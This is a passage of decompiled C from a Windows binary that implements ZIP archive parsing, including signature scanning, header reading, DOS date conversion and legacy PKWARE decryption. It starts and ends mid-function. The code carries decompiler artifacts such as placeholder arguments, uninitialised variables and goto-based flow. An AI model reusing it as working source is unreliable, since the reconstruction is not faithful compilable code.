    if (function_405d0e(a1, 0, 2) != 0) {
        // 0x405fde
        return -1;
    }
    uint32_t v2 = function_405cdd(a1); // 0x405efd
    v1 = 1028;
    int32_t * mem = malloc(1028); // 0x405f1d
    if (mem == NULL) {
        // 0x405fde
        return -1;
    }
    uint32_t v3 = v2 >= 0xffff ? 0xffff : v2;
    int32_t v4 = (int32_t)mem; // 0x405f1d
    v1 = 4;
    int32_t result = -1; // 0x405f3c
    int32_t v5; // bp-28, 0x405edf
    int32_t v6 = &v5; // 0x405f3c
    int32_t v7; // 0x405edf
    int32_t v8; // 0x405edf
    int32_t v9; // 0x405edf
    int32_t v10; // 0x405edf
    uint32_t v11; // 0x405f50
    if (v3 >= 5) {
        int32_t v12 = &v1; // 0x405f42
        int32_t * v13 = (int32_t *)(v12 - 4); // 0x405f70
        int32_t * v14 = (int32_t *)(v12 - 8); // 0x405f72
        int32_t * v15 = (int32_t *)(v12 - 12); // 0x405f73
        v9 = -1;
        v7 = 4;
        while (true) {
          lab_0x405f4d:;
            int32_t v16 = v9;
            v11 = v7 + 1024;
            v8 = v11 > v3 ? v3 : v11;
            int32_t v17 = v2 - v8; // 0x405f65
            *v13 = 0;
            *v14 = v17;
            *v15 = a1;
            int32_t v18 = function_405d0e(v8, (int32_t)&g54, (int32_t)&g54); // 0x405f76
            result = v16;
            if (v18 != 0) {
                // break -> 0x405fd2
                break;
            }
            int32_t v19 = v8 < 1028 ? v8 : 1028;
            *v13 = a1;
            *v14 = 1;
            *v15 = v19;
            *(int32_t *)(v12 - 16) = v4;
            int32_t v20 = function_405d8a(&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x405f89
            result = v16;
            if (v20 != 1) {
                // break -> 0x405fd2
                break;
            }
            int32_t v21 = v19 - 3; // 0x405f96
            v10 = v16;
            if (v21 >= 0) {
                int32_t v22 = v21; // 0x405edf
                int32_t v23 = v19 - 4;
                int32_t v24; // 0x405edf
                if (*(char *)(v23 + v4) == 80) {
                    // 0x405fa6
                    v24 = v22 + v4;
                    if (*(char *)v24 == 75) {
                        // 0x405fad
                        if (*(char *)(v24 + 1) == 5) {
                            // 0x405fb4
                            if (*(char *)(v24 + 2) == 6) {
                                // 0x405fbb
                                v10 = v23 + v17;
                                goto lab_0x405fc0;
                            }
                        }
                    }
                }
                int32_t v25 = v23 - 1; // 0x405f9e
                v22 = v23;
                v10 = v16;
                while (v23 >= 0) {
                    // 0x405fa0
                    v23 = v25;
                    if (*(char *)(v23 + v4) == 80) {
                        // 0x405fa6
                        v24 = v22 + v4;
                        if (*(char *)v24 == 75) {
                            // 0x405fad
                            if (*(char *)(v24 + 1) == 5) {
                                // 0x405fb4
                                if (*(char *)(v24 + 2) == 6) {
                                    // 0x405fbb
                                    v10 = v23 + v17;
                                    goto lab_0x405fc0;
                                }
                            }
                        }
                    }
                    // 0x405f99
                    v25 = v23 - 1;
                    v22 = v23;
                    v10 = v16;
                }
            }
            goto lab_0x405fc0;
        }
      lab_0x405fd2:
        // 0x405fd2
        v6 = v12 + 4;
    }
    // 0x405fd3
    *(int32_t *)(v6 - 4) = v4;
    free(&g54);
    // 0x405fde
    return result;
  lab_0x405fc0:
    // 0x405fc0
    v9 = 0;
    v7 = v8;
    result = v10;
    if (v3 > v11 != (v10 == 0)) {
        // break -> 0x405fd2
        goto lab_0x405fd2;
    }
    goto lab_0x405f4d;
}

// Address range: 0x405fe2 - 0x406162
int32_t function_405fe2(int32_t a1) {
    // 0x405fe2
    if (a1 == 0) {
        // 0x40615d
        return 0;
    }
    int32_t v1 = function_405edf(a1); // 0x40600b
    int32_t v2 = function_405d0e(a1, v1, 0); // 0x406021
    int32_t v3; // bp-20, 0x405fe2
    int32_t v4 = function_405e6b(a1, &v3); // 0x406035
    int32_t v5; // bp-8, 0x405fe2
    int32_t v6 = function_405e27(a1, &v5); // 0x406048
    int32_t v7; // bp-16, 0x405fe2
    int32_t v8 = function_405e27(a1, &v7); // 0x40605b
    int32_t v9; // bp-144, 0x405fe2
    int32_t v10 = function_405e27(a1, &v9); // 0x406071
    int32_t v11; // bp-12, 0x405fe2
    int32_t v12 = function_405e27(a1, &v11); // 0x406084
    int32_t v13; // 0x405fe2
    if (v11 != v9) {
        // 0x4060a9
        v13 = -103;
        goto lab_0x4060b0;
    } else {
        // 0x40609d
        v13 = v1 == -1 | (v4 | v2 | v6 | v8 | v10 | v12) != 0;
        if ((v5 || v7) == 0) {
            goto lab_0x4060b0;
        } else {
            // 0x4060a9
            v13 = -103;
            goto lab_0x4060b0;
        }
    }
  lab_0x4060b0:;
    // 0x4060b0
    int32_t v14; // bp-116, 0x405fe2
    int32_t v15 = function_405e6b(a1, &v14); // 0x4060b5
    int32_t v16; // bp-112, 0x405fe2
    int32_t v17 = function_405e6b(a1, &v16); // 0x4060c8
    int32_t v18; // bp-140, 0x405fe2
    int32_t v19 = function_405e27(a1, &v18); // 0x4060de
    int32_t * v20 = (int32_t *)(a1 + 12); // 0x4060ec
    int32_t v21 = *v20; // 0x4060ec
    int32_t result; // 0x405fe2
    if ((v15 | v13 || v17 || v19) == 0 == v21 + v1 >= v14 + v16) {
        int32_t v22 = a1; // bp-148, 0x406125
        *v20 = 0;
        int32_t * mem = malloc(128); // 0x40613e
        __asm_rep_movsd_memcpy((char *)mem, (char *)&v22, 32);
        function_4064e2((int32_t)&g54);
        result = (int32_t)mem;
    } else {
        // 0x406112
        function_405c9f(a1);
        result = 0;
    }
    // 0x40615d
    return result;
}

// Address range: 0x406162 - 0x406191
int32_t function_406162(int32_t a1) {
    if (a1 == 0) {
        // 0x40616b
        return -102;
    }
    // 0x406170
    if (*(int32_t *)(a1 + 124) != 0) {
        // 0x406176
        function_406a97(a1);
    }
    int32_t * v1 = (int32_t *)a1; // 0x40617d
    function_405c9f(*v1);
    free(v1);
    return 0;
}

// Address range: 0x406191 - 0x4061e0
int32_t function_406191(uint32_t a1, int32_t * a2) {
    int32_t v1 = (int32_t)a2;
    *(int32_t *)(v1 + 12) = a1 / 0x10000 & 31;
    *(int32_t *)(v1 + 20) = a1 / 0x2000000 + 1980;
    *(int32_t *)(v1 + 8) = a1 / 2048 & 31;
    int32_t result = a1 / 32 & 63; // 0x4061d1
    *(int32_t *)(v1 + 16) = (a1 / 0x200000 & 15) - 1;
    *(int32_t *)(v1 + 4) = result;
    *a2 = 2 * a1 & 62;
    return result;
}

// Address range: 0x4061e0 - 0x4064bb
int32_t function_4061e0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, uint32_t a5, int32_t a6, uint32_t a7, int32_t a8, uint32_t a9) {
    int32_t v1; // bp-108, 0x4061e0
    if (a1 == 0) {
        // 0x4061f4
        v1 = -102;
        // 0x4064b7
        return -102;
    }
    int32_t * v2 = (int32_t *)a1; // 0x406205
    int32_t v3 = -1; // 0x406211
    if (function_405d0e(*v2, *(int32_t *)(a1 + 12) + *(int32_t *)(a1 + 20), 0) == 0) {
        // 0x40621b
        int32_t v4; // bp-12, 0x4061e0
        int32_t v5 = function_405e6b(*v2, &v4); // 0x406221
        v3 = -1;
        if (v5 == 0) {
            // 0x406232
            v3 = v4 == 0x2014b50 ? 0 : -103;
        }
    }
    // 0x406245
    int32_t v6; // bp-96, 0x4061e0
    int32_t v7 = function_405e27(*v2, &v6); // 0x40624b
    int32_t v8; // bp-92, 0x4061e0
    int32_t v9 = function_405e27(*v2, &v8); // 0x40625f
    int32_t v10; // bp-88, 0x4061e0
    int32_t v11 = function_405e27(*v2, &v10); // 0x406273
    int32_t v12; // bp-84, 0x4061e0
    int32_t v13 = function_405e27(*v2, &v12); // 0x406287
    int32_t v14; // bp-80, 0x4061e0
    int32_t v15 = function_405e6b(*v2, &v14); // 0x40629b
    int32_t v16; // bp-40, 0x4061e0
    function_406191(v14, &v16);
    int32_t v17; // bp-76, 0x4061e0
    int32_t v18 = function_405e6b(*v2, &v17); // 0x4062bb
    int32_t v19; // bp-72, 0x4061e0
    int32_t v20 = function_405e6b(*v2, &v19); // 0x4062d0
    int32_t v21; // bp-68, 0x4061e0
    int32_t v22 = function_405e6b(*v2, &v21); // 0x4062e4
    int32_t v23; // bp-64, 0x4061e0
    int32_t v24 = function_405e27(*v2, &v23); // 0x4062f8
    int32_t v25; // bp-60, 0x4061e0
    int32_t v26 = function_405e27(*v2, &v25); // 0x40630c
    int32_t v27; // bp-56, 0x4061e0
    int32_t v28 = function_405e27(*v2, &v27); // 0x406320
    int32_t v29; // bp-52, 0x4061e0
    int32_t v30 = function_405e27(*v2, &v29); // 0x406334
    int32_t v31; // bp-48, 0x4061e0
    int32_t v32 = function_405e27(*v2, &v31); // 0x406348
    int32_t v33; // bp-44, 0x4061e0
    int32_t v34 = function_405e6b(*v2, &v33); // 0x40635c
    int32_t v35; // bp-16, 0x4061e0
    int32_t v36 = function_405e6b(*v2, &v35); // 0x406370
    int32_t v37 = (v9 | v7 | v11 | v13 | v15 | v18 | v20 | v22 | v24 | v26 | v28 | v30 | v32 | v34 | v36) == 0 ? v3 : -1;
    int32_t v38 = v37; // 0x406389
    int32_t v39 = v23; // 0x406389
    int32_t v40; // 0x4061e0
    int32_t v41; // 0x4063cc
    if (v37 != 0) {
        goto lab_0x406435;
    } else {
        // 0x40638f
        v40 = v37;
        v41 = v23;
        if (a4 == 0) {
            goto lab_0x4063d7;
        } else {
            int32_t v42 = a5; // 0x406399
            if (v23 < a5) {
                // 0x40639b
                *(char *)(v23 + a4) = 0;
                v42 = v23;
            }
            int32_t v43 = v37; // 0x4063ab
            if (a5 != 0 && v42 != 0) {
                // 0x4063b3
                v43 = function_405d8a((int32_t *)a4, v42, 1, *v2) == 1 ? v37 : -1;
            }
            // 0x4063c9
            v40 = v43;
            v41 = v23 - v42;
            v38 = v40;
            v39 = v41;
            if (v40 != 0) {
                goto lab_0x406435;
            } else {
                goto lab_0x4063d7;
            }
        }
    }
  lab_0x406435:;
    int32_t result = v38; // 0x406435
    int32_t v44 = v25 + v39; // 0x406435
    goto lab_0x406438;
  lab_0x406438:
    // 0x406438
    if (result != 0) {
        // 0x4064b7
        return result;
    }
    int32_t v45 = &v1; // 0x406378
    int32_t result3 = result; // 0x406443
    if (a8 != 0) {
        int32_t v46 = a9; // 0x40644d
        if (v27 < a9) {
            // 0x40644f
            *(char *)(v27 + a8) = 0;
            v46 = v27;
        }
        int32_t v47 = v46; // 0x406458
        int32_t v48 = result; // 0x406458
        if (v44 != 0) {
            // 0x40645a
            *(int32_t *)(v45 - 4) = 1;
            *(int32_t *)(v45 - 8) = v44;
            *(int32_t *)(v45 - 12) = *v2;
            int32_t v49 = function_405d0e((int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x40645f
            v47 = v27;
            v48 = v49 == 0 ? result : -1;
        }
        int32_t result2 = v48; // 0x406473
        if (a9 != 0 && v47 != 0) {
            // 0x40647b
            *(int32_t *)(v45 - 4) = *v2;
            *(int32_t *)(v45 - 8) = 1;
            *(int32_t *)(v45 - 12) = v46;
            *(int32_t *)(v45 - 16) = a8;
            int32_t v50 = function_405d8a(&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x406481
            result2 = v50 == 1 ? v48 : -1;
        }
        // 0x406492
        result3 = result2;
        if (result2 != 0) {
            // 0x4064b7
            return result2;
        }
    }
    // 0x406498
    if (a2 != 0) {
        // 0x40649f
        *(int32_t *)(v45 - 4) = 20;
        __asm_rep_movsd_memcpy((char *)a2, (char *)&v6, 20);
    }
    // 0x4064a7
    if (a3 != 0) {
        // 0x4064ae
        *(int32_t *)a3 = v35;
    }
    // 0x4064b7
    return result3;
  lab_0x4063d7:
    // 0x4063d7
    v38 = v40;
    v39 = v41;
    if (a6 == 0) {
        goto lab_0x406435;
    } else {
        int32_t v51 = v25; // 0x4063dd
        int32_t v52 = v51; // 0x4063ea
        int32_t v53 = v40; // 0x4063ea
        int32_t v54 = 0; // 0x4063ea
        if (v41 != 0) {
            int32_t v55 = function_405d0e(*v2, v41, 1); // 0x4063f1
            v52 = v25;
            v53 = v55 != 0 ? -1 : v40;
            v54 = (v55 != 0 ? -1 : v55) & v41;
        }
        int32_t v56 = v51 < a7 ? v51 : a7;
        int32_t v57 = v52; // 0x406409
        int32_t v58 = v53; // 0x406409
        if (a7 != 0 && v52 != 0) {
            int32_t v59 = *v2; // 0x406411
            v58 = function_405d8a((int32_t *)a6, v56, 1, v59) == 1 ? v53 : -1;
            v57 = v25;
        }
        // 0x406429
        result = v58;
        v44 = v54 - v56 + v57;
        goto lab_0x406438;
    }
}

// Address range: 0x4064bb - 0x4064e2
int32_t function_4064bb(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x4064bb
    return function_4061e0(a1, a2, 0, a3, a4, a5, a6, a7, a8);
}

// Address range: 0x4064e2 - 0x406520
int32_t function_4064e2(int32_t a1) {
    int32_t result = -102; // 0x4064ec
    if (a1 != 0) {
        // 0x4064f3
        *(int32_t *)(a1 + 20) = *(int32_t *)(a1 + 36);
        *(int32_t *)(a1 + 16) = 0;
        result = function_4061e0(a1, a1 + 40, a1 + 120, 0, 0, 0, 0, 0, 0);
        *(int32_t *)(a1 + 24) = (int32_t)(result == 0);
    }
    // 0x40651d
    return result;
}

// Address range: 0x406520 - 0x40657a
int32_t function_406520(int32_t a1) {
    // 0x406520
    if (a1 == 0) {
        // 0x406577
        return -102;
    }
    int32_t * v1 = (int32_t *)(a1 + 24); // 0x406530
    if (*v1 == 0) {
        // 0x406577
        return -100;
    }
    int32_t * v2 = (int32_t *)(a1 + 16); // 0x406535
    int32_t v3 = *v2 + 1; // 0x406538
    int32_t result = -100; // 0x40653c
    if (v3 != *(int32_t *)(a1 + 4)) {
        int32_t v4 = *(int32_t *)(a1 + 76); // 0x406549
        *v2 = v3;
        int32_t * v5 = (int32_t *)(a1 + 20); // 0x406560
        *v5 = *(int32_t *)(a1 + 80) + 46 + *(int32_t *)(a1 + 72) + v4 + *v5;
        result = function_4061e0(a1, a1 + 40, a1 + 120, 0, 0, 0, 0, 0, 0);
        *v1 = (int32_t)(result == 0);
    }
    // 0x406577
    return result;
}

// Address range: 0x40657a - 0x40671d
int32_t function_40657a(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4) {
    int32_t v1 = a1;
    int32_t v2 = (int32_t)a2;
    *a2 = 0;
    *a3 = 0;
    *a4 = 0;
    int32_t * v3 = (int32_t *)(a1 + 120); // 0x40659b
    int32_t * v4 = (int32_t *)a1; // 0x40659f
    if (function_405d0e(*v4, *v3 + *(int32_t *)(a1 + 12), 0) != 0) {
        // 0x406718
        return -1;
    }
    // 0x4065b5
    int32_t v5; // bp-12, 0x40657a
    int32_t v6 = function_405e6b(*v4, &v5); // 0x4065bb
    int32_t v7 = -1; // 0x4065c4
    if (v6 == 0) {
        // 0x4065cb
        v7 = v5 == 0x4034b50 ? 0 : -103;
    }
    int32_t v8 = function_405e27(*v4, &v2); // 0x4065dd
    int32_t v9 = function_405e27(*v4, &v1); // 0x4065f1
    int32_t v10 = function_405e27(*v4, &v2); // 0x406605
    int32_t v11 = -1; // 0x40660e
    if (v10 == 0) {
        int32_t v12 = (v9 | v8) == 0 ? v7 : -1;
        v11 = v12;
        if (v12 == 0) {
            int32_t v13 = *(int32_t *)(a1 + 52); // 0x406619
            v11 = v2 == v13 == (v13 | 8) == 8 ? v12 : -103;
        }
    }
    int32_t v14 = function_405e6b(*v4, &v2); // 0x406633
    int32_t v15 = function_405e6b(*v4, &v2); // 0x406647
    int32_t v16 = -1; // 0x406650
    if (v15 == 0) {
        int32_t v17 = v14 == 0 ? v11 : -1;
        v16 = v17;
        if (v17 == 0) {
            // 0x40665b
            v16 = v17;
            if (v2 != *(int32_t *)(a1 + 60)) {
                // 0x406663
                v16 = (v1 & 8) != 0 ? v17 : -103;
            }
        }
    }
    int32_t v18 = function_405e6b(*v4, &v2); // 0x406672
    int32_t v19 = -1; // 0x40667b
    if (v18 == 0) {
        // 0x406682
        v19 = v16;
        if (v16 == 0) {
            // 0x406686
            v19 = v16;
            if (v2 != *(int32_t *)(a1 + 64)) {
                // 0x40668e
                v19 = (v1 & 8) != 0 ? v16 : -103;
            }
        }
    }
    int32_t v20 = function_405e6b(*v4, &v2); // 0x40669d
    int32_t v21 = -1; // 0x4066a6
    if (v20 == 0) {
        // 0x4066ad
        v21 = v19;
        if (v19 == 0) {
            // 0x4066b1
            v21 = v19;
            if (v2 != *(int32_t *)(a1 + 68)) {
                // 0x4066b9
                v21 = (v1 & 8) != 0 ? v19 : -103;
            }
        }
    }
    // 0x4066c2
    int32_t v22; // bp-8, 0x40657a
    int32_t v23 = function_405e27(*v4, &v22); // 0x4066c8
    int32_t v24 = -1; // 0x4066d4
    if (v23 == 0) {
        // 0x4066db
        v24 = v21;
        if (v21 == 0) {
            // 0x4066df
            v24 = v22 == *(int32_t *)(a1 + 72) ? v21 : -103;
        }
    }
    // 0x4066e7
    *a2 = *a2 + v22;
    int32_t v25; // bp-16, 0x40657a
    int32_t v26 = function_405e27(*v4, &v25); // 0x4066ef
    *a3 = *v3 + 30 + v22;
    *a4 = v25;
    *a2 = *a2 + v25;
    // 0x406718
    return v26 == 0 ? v24 : -1;
}

// Address range: 0x40671d - 0x406880
int32_t function_40671d(int32_t a1, int32_t a2) {
    // 0x40671d
    if (a1 == 0 || *(int32_t *)(a1 + 24) == 0) {
        // 0x40687b
        return -102;
    }
    int32_t * v1 = (int32_t *)(a1 + 124); // 0x406738
    if (*v1 != 0) {
        // 0x40673d
        function_406a97(a1);
    }
    // 0x406744
    int32_t v2; // bp-12, 0x40671d
    int32_t v3; // bp-16, 0x40671d
    int32_t v4; // bp-8, 0x40671d
    if (function_40657a(a1, &v3, &v4, &v2) != 0) {
        // 0x40687b
        return -103;
    }
    int32_t * mem = malloc(132); // 0x406766
    if (mem == NULL) {
        // 0x40687b
        return -104;
    }
    int32_t v5 = (int32_t)mem; // 0x406766
    int32_t * mem2 = malloc(0x4000); // 0x406778
    *mem = (int32_t)mem2;
    *(int32_t *)(v5 + 68) = v4;
    *(int32_t *)(v5 + 72) = v2;
    *(int32_t *)(v5 + 76) = 0;
    if (mem2 == NULL) {
        // 0x406794
        free(mem);
        // 0x40687b
        return -104;
    }
    int32_t * v6 = (int32_t *)(v5 + 64); // 0x4067a4
    *v6 = 0;
    int32_t * v7 = (int32_t *)(a1 + 60); // 0x4067a7
    int32_t * v8 = (int32_t *)(a1 + 52); // 0x4067ac
    *(int32_t *)(v5 + 84) = *v7;
    *(int32_t *)(v5 + 80) = 0;
    *(int32_t *)(v5 + 100) = *v8;
    *(int32_t *)(v5 + 96) = *(int32_t *)a1;
    *(int32_t *)(v5 + 104) = *(int32_t *)(a1 + 12);
    *(int32_t *)(v5 + 24) = 0;
    if (*v8 != 0) {
        // 0x4067d0
        *(int32_t *)(v5 + 36) = 0;
        *(int32_t *)(v5 + 40) = 0;
        *(int32_t *)(v5 + 44) = 0;
        if (function_405777(v5 + 4) == 0) {
            // 0x4067e7
            *v6 = 1;
        }
    }
    // 0x4067ee
    *(int32_t *)(v5 + 88) = *(int32_t *)(a1 + 64);
    *(int32_t *)(v5 + 92) = *(int32_t *)(a1 + 68);
    int32_t v9 = a1 + 48; // 0x4067fa
    char * v10 = (char *)(v5 + 108); // 0x4067ff
    *v10 = *(char *)v9 & 1;
    int32_t v11; // 0x40671d
    if ((*(int32_t *)v9 & 8) == 0) {
        // 0x406814
        v11 = *v7 / 0x1000000;
    } else {
        // 0x40680c
        v11 = *(int32_t *)(a1 + 56) / 256;
    }
    // 0x40681a
    *(char *)(v5 + 128) = (char)v11;
    int32_t v12 = v5 + 112; // 0x406827
    *(int32_t *)(v5 + 116) = 0x23456789;
    *(int32_t *)(v5 + 124) = *v10 == 0 ? 0 : 12;
    *(int32_t *)v12 = 0x12345678;
    *(int32_t *)(v5 + 120) = 0x34567890;
    if (a2 != 0) {
        // 0x40684e
        int32_t v13; // bp-28, 0x40671d
        int32_t v14 = &v13; // 0x40677e
        int32_t v15 = a2; // 0x40685e
        unsigned char v16 = *(char *)v15; // 0x406851
        while (v16 != 0) {
            // 0x406857
            *(int32_t *)(v14 - 4) = v15 & -256 | (int32_t)v16;
            *(int32_t *)(v14 - 8) = v12;
            function_405535(v15, (char)&g54);
            v15++;
            if (v15 == 0) {
                // break -> 0x406865
                break;
            }
            v16 = *(char *)v15;
        }
    }
    // 0x406865
    *(int32_t *)(v5 + 8) = 0;
    *(int32_t *)(v5 + 60) = *(int32_t *)(a1 + 120) + 30 + v3;
    *v1 = v5;
    // 0x40687b
    return 0;
}

// Address range: 0x406880 - 0x406a97
int32_t function_406880(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    if (a4 != 0) {
        // 0x406897
        *(char *)a4 = 0;
    }
    // 0x406899
    if (a1 == 0) {
        // 0x406a92
        return -102;
    }
    int32_t v1 = *(int32_t *)(a1 + 124); // 0x4068a7
    if (v1 == 0) {
        // 0x406a92
        return -102;
    }
    int32_t * v2 = (int32_t *)v1; // 0x4068ae
    if (*v2 == 0) {
        // 0x406a92
        return -100;
    }
    // 0x4068b9
    if (a3 == 0) {
        // 0x406a92
        return 0;
    }
    int32_t * v3 = (int32_t *)(v1 + 20); // 0x4068c7
    *v3 = a3;
    int32_t * v4 = (int32_t *)(v1 + 16); // 0x4068ca
    *v4 = a2;
    int32_t * v5 = (int32_t *)(v1 + 92); // 0x4068cd
    uint32_t v6 = *v5; // 0x4068cd
    int32_t v7; // 0x406880
    if (v6 < a3) {
        // 0x4068d4
        *v3 = v6;
        v7 = v6;
    } else {
        // 0x4068d7
        v7 = *v3;
    }
    // 0x4068d7
    if (v7 == 0) {
        // 0x406a92
        return 0;
    }
    // 0x4068e0
    int32_t v8; // bp-24, 0x406880
    int32_t v9 = &v8; // 0x40688e
    int32_t * v10 = (int32_t *)(v1 + 8); // 0x4068e0
    int32_t * v11 = (int32_t *)(v1 + 88);
    int32_t * v12 = (int32_t *)(v9 - 4);
    int32_t * v13 = (int32_t *)(v1 + 60);
    int32_t * v14 = (int32_t *)(v9 - 8);
    int32_t * v15 = (int32_t *)(v1 + 96);
    int32_t * v16 = (int32_t *)(v9 - 12);
    int32_t * v17 = (int32_t *)(v9 - 16);
    int32_t v18 = v1 + 4;
    int32_t * v19 = (int32_t *)v18;
    int32_t * v20 = (int32_t *)(v1 + 124);
    int32_t * v21 = (int32_t *)(v1 + 80);
    int32_t * v22 = (int32_t *)(v1 + 24);
    char * v23 = (char *)a4;
    int32_t v24 = 0;
    int32_t v25 = 0;
    int32_t result; // 0x406880
    while (true) {
        int32_t v26 = v25;
        int32_t v27 = v24;
        int32_t v28 = *v10; // 0x4068e0
        int32_t v29 = v28; // 0x4068e4
        if (v28 == 0) {
            uint32_t v30 = *v11; // 0x4068ea
            v29 = v28;
            if (v30 != 0) {
                // 0x4068f5
                *v12 = 0;
                *v14 = *v13 + *(int32_t *)(v1 + 104);
                *v16 = *v15;
                int32_t v31 = function_405d0e(v26, (int32_t)&g54, (int32_t)&g54); // 0x406914
                result = -1;
                if (v31 != 0) {
                    // break -> 0x406a92
                    break;
                }
                int32_t v32 = v30 >= 0x4000 ? 0x4000 : v30;
                *v12 = *v15;
                *v14 = 1;
                *v16 = v32;
                *v17 = *v2;
                int32_t v33 = function_405d8a(&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x40692c
                result = -1;
                if (v33 != 1) {
                    // break -> 0x406a92
                    break;
                }
                // 0x40693d
                *v13 = *v13 + v32;
                *v11 = *v11 - v32;
                int32_t v34 = *v2; // 0x406943
                *v19 = v34;
                *v10 = v32;
                int32_t v35 = 0; // 0x40694f
                v29 = v32;
                if (*(char *)(v1 + 108) != 0) {
                    char * v36 = (char *)(v35 + v34); // 0x40695c
                    *v12 = v35 & -256 | (int32_t)*v36;
                    *v14 = v1 + 112;
                    int32_t v37 = function_4055a3(v35, (int32_t)&g54); // 0x406964
                    int32_t v38 = v35 + 1; // 0x40696e
                    *v36 = (char)v37;
                    v35 = v38;
                    while (v38 < v32) {
                        // 0x406959
                        v36 = (char *)(v35 + v34);
                        *v12 = v35 & -256 | (int32_t)*v36;
                        *v14 = v1 + 112;
                        v37 = function_4055a3(v35, (int32_t)&g54);
                        v38 = v35 + 1;
                        *v36 = (char)v37;
                        v35 = v38;
                    }
                    // 0x40697c
                    v29 = *v10;
                }
            }
        }
        uint32_t v39 = v29; // 0x40697f
        uint32_t v40 = *v20; // 0x40697c
        int32_t v41 = v40 > v39 ? v39 : v40;
        if (v41 != 0) {
            int32_t v42 = *v19 + v41;
            char v43 = *(char *)(v42 - 1); // 0x406994
            int32_t v44 = v40 - v41; // 0x406998
            *v20 = v44;
            *v10 = v39 - v41;
            *v19 = v42;
            if (v44 == 0) {
                // 0x4069a3
                if (*(char *)(v1 + 128) != v43) {
                    // 0x406a7e
                    *v12 = -106;
                    result = -106;
                    return result;
                }
            }
        }
        // 0x4069af
        int32_t v45; // 0x406880
        int32_t v46; // 0x406880
        if (*(int32_t *)(v1 + 100) != 0) {
            int32_t v47 = *v4; // 0x406a0f
            *v12 = 2;
            *v14 = v18;
            int32_t v48 = function_40583c(v47, (int32_t)&g54); // 0x406a1e
            int32_t v49 = *v22 - *v22; // 0x406a29
            *v16 = v49;
            *v17 = v47;
            *(int32_t *)(v9 - 20) = *v21;
            int32_t v50 = function_40541f(v48, (int32_t)&g54, (int32_t)&g54); // 0x406a32
            *v5 = *v5 - v49;
            int32_t v51 = v49 + v26; // 0x406a3a
            *v21 = v50;
            if (v48 == 1 | *v5 == 0) {
                // 0x406a83
                result = v51;
                if (a4 == 0) {
                    return result;
                } else {
                    // 0x406a8a
                    *v23 = 1;
                    result = v51;
                    return result;
                }
            }
            // 0x406a50
            v45 = v48;
            v46 = v51;
            int32_t v52 = v48; // 0x406a54
            if (v48 != 0) {
                // 0x406a8f
                result = v52;
                return result;
            }
        } else {
            uint32_t v53 = *v3; // 0x4069b5
            uint32_t v54 = *v10; // 0x4069b8
            int32_t v55 = v53 >= v54 ? v54 : v53;
            if (v55 != 0) {
                int32_t v56 = 0;
                *(char *)(*v4 + v56) = *(char *)(*v19 + v56);
                int32_t v57 = v56 + 1; // 0x4069d3
                while (v57 != v55) {
                    // 0x4069c7
                    v56 = v57;
                    *(char *)(*v4 + v56) = *(char *)(*v19 + v56);
                    v57 = v56 + 1;
                }
            }
            // 0x4069d8
            *v12 = v55;
            *v14 = *v4;
            *v16 = *v21;
            int32_t v58 = function_40541f((int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x4069df
            *v5 = *v5 - v55;
            *v10 = *v10 - v55;
            *v3 = *v3 - v55;
            *v4 = *v4 + v55;
            *v19 = *v19 + v55;
            *v22 = *v22 + v55;
            int32_t v59 = v55 + v26; // 0x4069f6
            *v21 = v58;
            v45 = v27;
            v46 = v59;
            if (!((a4 == 0 | *v5 != 0))) {
                // 0x406a0a
                *v23 = 1;
                v45 = v27;
                v46 = v59;
            }
        }
        // 0x406a59
        v25 = v46;
        v24 = v45;
        if (*v3 == 0) {
            // 0x406a63
            result = v25;
            if (v24 != 0) {
                // 0x406a8f
                result = v24;
                return result;
            } else {
                return result;
            }
        }
    }
  lab_0x406a92:
    // 0x406a92
    return result;
}

// Address range: 0x406a97 - 0x406b02
int32_t function_406a97(int32_t a1) {
    // 0x406a97
    if (a1 == 0) {
        // 0x406afd
        return -102;
    }
    int32_t * v1 = (int32_t *)(a1 + 124); // 0x406aa9
    int32_t v2 = *v1; // 0x406aa9
    if (v2 == 0) {
        // 0x406afd
        return -102;
    }
    int32_t result = 0; // 0x406ab8
    if (*(int32_t *)(v2 + 92) == 0) {
        int32_t v3 = *(int32_t *)(v2 + 84); // 0x406abd
        result = *(int32_t *)(v2 + 80) == v3 ? 0 : -105;
    }
    int32_t * v4 = (int32_t *)v2; // 0x406aca
    int32_t v5 = *v4; // 0x406aca
    if (v5 != 0) {
        // 0x406ad7
        free((int32_t *)v5);
        *v4 = 0;
    }
    int32_t * v6 = (int32_t *)(v2 + 64); // 0x406add
    *v4 = 0;
    if (*v6 != 0) {
        // 0x406ae4
        function_405739(v2 + 4);
    }
    // 0x406aee
    *v6 = 0;
    free(v4);
    *v1 = 0;
    // 0x406afd
    return result;
}

// Address range: 0x406b02 - 0x406b23
int32_t function_406b02(uint32_t a1) {
    // 0x406b02
    return __allmul((int64_t)(int32_t)(a1 - 0x49ef6f00), (int64_t)(int32_t)(((int32_t)a1 >> 31) + 2 + (int32_t)(bool)(a1 > 0x49ef6eff)));
}

// Address range: 0x406b23 - 0x406b8e
int32_t function_406b23(uint32_t a1, int32_t a2) {
    int32_t lpSystemTime = (a1 / 512 & 127) + 1980; // bp-28, 0x406b3e
    int32_t lpFileTime; // bp-12, 0x406b23
    SystemTimeToFileTime((struct _SYSTEMTIME *)&lpSystemTime, (struct _FILETIME *)&lpFileTime);
    return lpFileTime;
}

// Address range: 0x406b8e - 0x406c40
int32_t function_406b8e(int32_t hFile, int32_t a2, int32_t a3) {
    // 0x406b8e
    int32_t v1; // 0x406b8e
    if (v1 != 0 || *(int32_t *)(v1 + 4) != -1) {
        // 0x406c3b
        return 0x1000000;
    }
    char * lpBuffer = (char *)(v1 + 320); // 0x406baf
    char * v2 = lpBuffer; // bp-20, 0x406baf
    GetCurrentDirectoryA(260, lpBuffer);
    int32_t v3; // 0x406b8e
    switch (*(char *)(v3 + 319 + strlen(lpBuffer))) {
        default: {
            // 0x406bd1
            strcat(lpBuffer, g25);
        }
        case 92: {
        }
        case 47: {
            int32_t v4 = (int32_t)&v2; // 0x406be3
            if (a3 == 1) {
                int32_t v5 = hFile; // bp-36, 0x406beb
